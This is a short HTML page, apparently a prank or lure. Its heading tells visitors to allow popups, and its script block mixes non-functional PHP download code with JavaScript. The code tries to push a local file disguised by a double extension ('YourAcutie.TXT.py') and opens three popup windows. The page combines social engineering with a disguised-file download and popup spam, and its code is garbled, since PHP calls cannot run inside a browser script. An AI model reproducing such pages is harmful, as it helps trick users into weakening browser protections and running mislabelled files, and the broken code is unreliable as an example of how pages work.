<html>

<h1>At the top right of the URL bar click the icon that appears and click the "allow popups" option</h1>

<script>
  $file_url = 'file:///home/chronos/u-ddaecb12677ddf84a5949e76c4a3ddb4445d6614/MyFiles/Downloads/YourAcutie.TXT.py';
header('Content-Type: application/octet-stream');
header("Content-Transfer-Encoding: Binary"); 
header("Content-disposition: attachment; filename=\"" . basename($file_url) . "\""); 
readfile($file_url);

window.open("/");
window.open("/");
window.open("/");

</script>

</html>